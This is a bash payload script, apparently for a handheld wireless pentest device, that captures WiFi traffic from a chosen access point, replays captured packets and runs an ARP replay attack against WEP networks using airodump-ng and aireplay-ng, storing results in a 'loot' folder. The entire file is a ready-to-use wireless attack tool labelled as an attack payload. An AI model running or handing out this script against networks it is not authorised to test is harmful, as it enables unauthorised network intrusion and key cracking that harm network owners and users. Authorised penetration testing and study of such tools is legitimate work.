#!/bin/bash
# Title: Packet Replay
# Author: NullSec
# Description: Capture and replay WiFi packets
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/packetreplay"
mkdir -p "$LOOT_DIR"

PROMPT "PACKET REPLAY

Capture and replay WiFi
packets for:

1. Packet capture
2. Replay attack
3. ARP replay (WEP)

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "MODE:

1. Capture packets
2. Replay captured packets
3. ARP replay attack

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

TARGET_BSSID=$(MAC_PICKER "Target BSSID:")
[ -z "$TARGET_BSSID" ] && { ERROR_DIALOG "No BSSID entered!"; exit 1; }

TARGET_CH=$(NUMBER_PICKER "Channel:" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_CH=6 ;; esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START PACKET REPLAY?

Mode: $MODE
Target: $TARGET_BSSID
Channel: $TARGET_CH
Duration: ${DURATION}s

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Packet replay mode $MODE..."
iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null

case $MODE in
    1)
        CAP_FILE="$LOOT_DIR/capture_$(date +%Y%m%d_%H%M)"
        LOG "Capturing packets..."
        timeout "$DURATION" airodump-ng "$MON_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
        wait $!
        PROMPT "CAPTURE COMPLETE

File: ${CAP_FILE}-01.cap
Press OK to exit."
        ;;
    2)
        LATEST_CAP=$(ls -t "$LOOT_DIR"/*.cap 2>/dev/null | head -1)
        [ -z "$LATEST_CAP" ] && { ERROR_DIALOG "No captures found!"; exit 1; }
        LOG "Replaying: $LATEST_CAP"
        timeout "$DURATION" aireplay-ng -2 -r "$LATEST_CAP" -b "$TARGET_BSSID" "$MON_IF" 2>/dev/null
        PROMPT "REPLAY COMPLETE

Replayed: $LATEST_CAP
Press OK to exit."
        ;;
    3)
        LOG "ARP replay attack..."
        CAP_FILE="$LOOT_DIR/arp_$(date +%Y%m%d_%H%M)"
        airodump-ng "$MON_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
        sleep 3
        timeout "$DURATION" aireplay-ng -3 -b "$TARGET_BSSID" "$MON_IF" 2>/dev/null
        killall airodump-ng 2>/dev/null
        PROMPT "ARP REPLAY COMPLETE

Capture: ${CAP_FILE}-01.cap
Press OK to exit."
        ;;
esac
